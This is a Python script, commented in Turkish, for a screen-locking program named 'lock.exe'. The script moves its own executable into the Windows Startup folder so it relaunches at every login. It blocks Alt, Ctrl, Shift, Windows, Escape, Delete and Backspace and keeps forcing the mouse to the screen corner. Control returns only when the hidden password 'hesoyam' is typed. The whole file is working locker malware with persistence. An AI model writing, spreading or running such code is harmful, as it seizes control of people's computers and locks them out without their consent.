import keyboard
import mouse
import shutil
import os

BizimDosyaAdiExeUzantili = "lock.exe"
fareyiKilitle = True

def find(name, path):
    for root, dirs, files in os.walk(path):
        if name in files:
            return os.path.join(root, name)


#Başlangıçta çalıştırma muhabbeti
def BaslangicaTasi():
    hedefKonum = os.path.expanduser('~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
    oradaMi = hedefKonum + "/" + BizimDosyaAdiExeUzantili

    aramaSonucu = find(BizimDosyaAdiExeUzantili, "C:")

    if(aramaSonucu != None):
        if not os.path.isfile(oradaMi):
            shutil.move(os.path.join(aramaSonucu), hedefKonum)
    else:
        aramaSonucu = find(BizimDosyaAdiExeUzantili, "D:")
        if not os.path.isfile(oradaMi):
            shutil.move(os.path.join(aramaSonucu), hedefKonum)



#klavye kilitleme
def KlavyeyiKilitle():
    engellenecekTuslar = {'alt','escape','delete','backspace', 'alt gr', 'ctrl', 'left alt', 'left ctrl', 'left shift', 'left windows', 'right alt', 'right ctrl', 'right shift', 'right windows', 'shift', 'windows'}
    for herBirTus in engellenecekTuslar:
        keyboard.block_key(herBirTus)
KlavyeyiKilitle()

def kapat():
    keyboard.unhook_all()
    global fareyiKilitle
    fareyiKilitle = False

#programı kapatmak için şifre hesoyam yazıp space ya da enter basılması
keyboard.add_word_listener('hesoyam', kapat, triggers=['space', 'enter'], match_suffix=True, timeout=3)

#programın kapanma şartı ve mouse kilitleme
while (fareyiKilitle):
    mouse.move(0,0, absolute=True, duration=0)